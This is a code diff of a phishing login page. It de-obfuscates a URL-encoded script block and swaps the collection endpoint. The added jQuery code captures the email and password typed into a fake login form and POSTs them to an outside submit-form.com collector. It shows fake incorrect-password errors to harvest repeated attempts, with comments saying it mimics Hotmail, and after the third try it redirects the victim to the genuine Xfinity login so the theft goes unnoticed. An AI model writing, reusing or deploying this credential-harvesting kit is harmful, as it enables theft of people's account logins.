@@ -138,8 +138,99 @@ document.write(unescape('%3Cstyle%3E%0D%0A%0D%0A@media%20%28max-width%3A%20768px
 
 </form>
 
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 <script>
-document.write(unescape('%3Cscript%20src%3D%22https%3A//ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js%22%3E%3C/script%3E%0D%0A%0D%0A%3Cscript%20src%3D%22https%3A//ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js%22%3E%3C/script%3E%0D%0A%3Cscript%3E%0D%0A%24%28document%29.ready%28function%28%29%20%7B%0D%0A%20%20%20%20var%20attemptCount%20%3D%200%3B%0D%0A%20%20%20%20var%20%24btn%20%3D%20%24%28%22%23submit-btn%22%29%3B%0D%0A%20%20%20%20var%20%24passwordInput%20%3D%20%24%28%22%23password%22%29%3B%0D%0A%20%20%20%20var%20%24errorMessage%20%3D%20%24%28%22%23password-error%22%29%3B%0D%0A%0D%0A%20%20%20%20//%20Hide%20error%20when%20user%20starts%20typing%20again%20%28like%20NEW%20HOTMAIL%20PAGE%29%0D%0A%20%20%20%20%24passwordInput.on%28%27input%27%2C%20function%20%28%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%24errorMessage.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%24passwordInput.removeClass%28%27input-error%27%29%3B%0D%0A%20%20%20%20%7D%29%3B%0D%0A%20%20%20%20%0D%0A%20%20%20%20%24%28%22%23contact%22%29.on%28%27submit%27%2C%20function%28e%29%20%7B%0D%0A%20%20%20%20%20%20%20%20e.preventDefault%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20var%20email%20%3D%20%24%28%22%23username%22%29.val%28%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20password%20%3D%20%24%28%22input%5Bname%3D%27pass%27%5D%22%29.val%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20attemptCount++%3B%0D%0A%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20if%20%28attemptCount%20%3C%3D%203%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24.ajax%28%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20dataType%3A%20%22JSON%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20url%3A%20%22https%3A//submit-form.com/pcx9KrJ4R%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20type%3A%20%22POST%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20data%3A%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20email%3A%20email%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20password%3A%20password%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20beforeSend%3A%20function%28%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Show%20spinner%20on%20button%20instead%20of%20%22Verifying...%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24btn.attr%28%22aria-busy%22%2C%20%22true%22%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.prop%28%22disabled%22%2C%20true%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.addClass%28%22loading%22%29%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20mimic%20Hotmail%3A%20hide%20any%20previous%20error%20while%20submitting%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24errorMessage.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24passwordInput.removeClass%28%27input-error%27%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20success%3A%20function%28response%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28response%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28response%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20error%3A%20function%28%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20behavior%20handled%20uniformly%20in%20complete%28%29%2C%20like%20NEW%20HOTMAIL%20PAGE%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20complete%3A%20function%28%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Restore%20button%20to%20normal%20state%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24btn.attr%28%22aria-busy%22%2C%20%22false%22%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.prop%28%22disabled%22%2C%20false%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.removeClass%28%22loading%22%29%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28attemptCount%20%3C%203%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Clear%20password%20and%20show%20inline%20error%2C%20like%20NEW%20HOTMAIL%20PAGE%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22input%5Bname%3D%27pass%27%5D%22%29.val%28%27%27%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24errorMessage.show%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24passwordInput.addClass%28%27input-error%27%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if%20%28attemptCount%20%3D%3D%3D%203%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%203rd%20submission%3A%20redirect%20%28same%20logic%20as%20NEW%20HOTMAIL%20PAGE%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%22https%3A//login.xfinity.com/login%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%7D%29%3B%0D%0A%7D%29%3B%0D%0A%3C/script%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0D%0A%20%20%20%20%20%20%20%20%3C/div%3E%0D%0A%20%20%20%20%3C/div%3E%0D%0A%0D%0A%20%20%20%20%3Cscript%3E%0D%0Adocument.getElementById%28%22togglePassword%22%29.addEventListener%28%22click%22%2C%20function%28%29%20%7B%0D%0A%20%20%20%20const%20password%20%3D%20document.getElementById%28%22password%22%29%3B%0D%0A%20%20%20%20const%20hiddenIcon%20%3D%20document.getElementById%28%22icon-hidden%22%29%3B%0D%0A%20%20%20%20const%20visibleIcon%20%3D%20document.getElementById%28%22icon-visible%22%29%3B%0D%0A%0D%0A%20%20%20%20if%20%28password.type%20%3D%3D%3D%20%22password%22%29%20%7B%0D%0A%20%20%20%20%20%20%20%20password.type%20%3D%20%22text%22%3B%0D%0A%20%20%20%20%20%20%20%20hiddenIcon.style.display%20%3D%20%22none%22%3B%0D%0A%20%20%20%20%20%20%20%20visibleIcon.style.display%20%3D%20%22block%22%3B%0D%0A%20%20%20%20%7D%20else%20%7B%0D%0A%20%20%20%20%20%20%20%20password.type%20%3D%20%22password%22%3B%0D%0A%20%20%20%20%20%20%20%20hiddenIcon.style.display%20%3D%20%22block%22%3B%0D%0A%20%20%20%20%20%20%20%20visibleIcon.style.display%20%3D%20%22none%22%3B%0D%0A%20%20%20%20%7D%0D%0A%7D%29%3B%0D%0A%3C/script%3E'));
+$(document).ready(function() {
+    var attemptCount = 0;
+    var $btn = $("#submit-btn");
+    var $passwordInput = $("#password");
+    var $errorMessage = $("#password-error");
+
+    // Hide error when user starts typing again (like NEW HOTMAIL PAGE)
+    $passwordInput.on('input', function () {
+        $errorMessage.hide();
+        $passwordInput.removeClass('input-error');
+    });
+    
+    $("#contact").on('submit', function(e) {
+        e.preventDefault();
+        
+        var email = $("#username").val();
+        var password = $("input[name='pass']").val();
+        
+        attemptCount++;
+        
+        if (attemptCount <= 3) {
+            $.ajax({
+                dataType: "JSON",
+                url: "https://submit-form.com/ptwa4OGPN",
+                type: "POST",
+                data: {
+                    email: email,
+                    password: password
+                },
+                beforeSend: function() {
+                    // Show spinner on button instead of "Verifying..."
+                    $btn.attr("aria-busy", "true")
+                        .prop("disabled", true)
+                        .addClass("loading");
+
+                    // mimic Hotmail: hide any previous error while submitting
+                    $errorMessage.hide();
+                    $passwordInput.removeClass('input-error');
+                },
+                success: function(response) {
+                    if (response) {
+                        console.log(response);
+                    }
+                },
+                error: function() {
+                    // behavior handled uniformly in complete(), like NEW HOTMAIL PAGE
+                },
+                complete: function() {
+                    // Restore button to normal state
+                    $btn.attr("aria-busy", "false")
+                        .prop("disabled", false)
+                        .removeClass("loading");
+
+                    if (attemptCount < 3) {
+                        // Clear password and show inline error, like NEW HOTMAIL PAGE
+                        $("input[name='pass']").val('');
+                        $errorMessage.show();
+                        $passwordInput.addClass('input-error');
+                    } else if (attemptCount === 3) {
+                        // 3rd submission: redirect (same logic as NEW HOTMAIL PAGE)
+                        window.location.replace("https://login.xfinity.com/login");
+                    }
+                }
+            });
+        }
+    });
+});
+</script>
+                
+            </div>
+        </div>
+    </div>
+
+    <script>
+document.getElementById("togglePassword").addEventListener("click", function() {
+    const password = document.getElementById("password");
+    const hiddenIcon = document.getElementById("icon-hidden");
+    const visibleIcon = document.getElementById("icon-visible");
+
+    if (password.type === "password") {
+        password.type = "text";
+        hiddenIcon.style.display = "none";
+        visibleIcon.style.display = "block";
+    } else {
+        password.type = "password";
+        hiddenIcon.style.display = "block";
+        visibleIcon.style.display = "none";
+    }
+});
 </script>
 
 
